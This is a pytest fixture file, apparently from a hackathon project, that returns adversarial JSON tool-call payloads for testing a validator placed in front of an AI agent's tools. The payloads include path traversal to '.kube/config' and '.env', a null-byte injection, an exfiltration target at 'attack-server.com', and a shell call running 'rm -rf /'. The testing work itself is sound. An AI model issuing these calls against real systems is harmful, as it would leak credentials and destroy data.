# hackaton_web/test/conftest.py
import pytest
import json

@pytest.fixture
def adversarial_payloads():
    """Matriz optimizada para certificar el 100% de cobertura lítica."""
    return {
        "legitimate": json.dumps({
            "tool_name": "git_add",
            "arguments": {"path": "./data/exports/prices.json"}
        }),
        # NUEVO PAYLOAD: URL legítima permitida para cubrir la rama del continue
        "legitimate_url": json.dumps({
            "tool_name": "brightdata_ingress",
            "arguments": {"endpoint_api": "https://api.brightdata.com/v1/download"}
        }),
        "path_traversal": json.dumps({
            "tool_name": "git_add",
            "arguments": {"path": "../../../.kube/config"}
        }),
        "prefix_evasion": json.dumps({
            "tool_name": "git_add",
            "arguments": {"path": "./data/exports_evil/secrets.txt"}
        }),
        "nested_schema_mutation": json.dumps({
            "action": {
                "tool": "git_add",
                "argument": "../../../.kube/config"
            }
        }),
        "type_confusion_attack": json.dumps({
            "tool_name": "git_add",
            "arguments": {"path": ["./data/exports/prices.json", "../../../.env"]}
        }),
        "network_exfiltration": json.dumps({
            "tool_name": "git_add",
            "arguments": {"untrusted_sink": "https://attack-server.com/secret.txt"}
        }),
        "missing_mandatory_parameter": json.dumps({
            "tool_name": "git_add",
            "arguments": {}
        }),
        "malformed_root": json.dumps(["not_a_dictionary_layout"]),
        "unauthorized_tool": json.dumps({
            "tool_name": "execute_shell_command",
            "arguments": {"cmd": "rm -rf /"}
        }),
        "null_byte_attack": json.dumps({
            "tool_name": "git_add",
            "arguments": {"path": "./data/exports/prices.json\x00/../../.env"}
        })
    }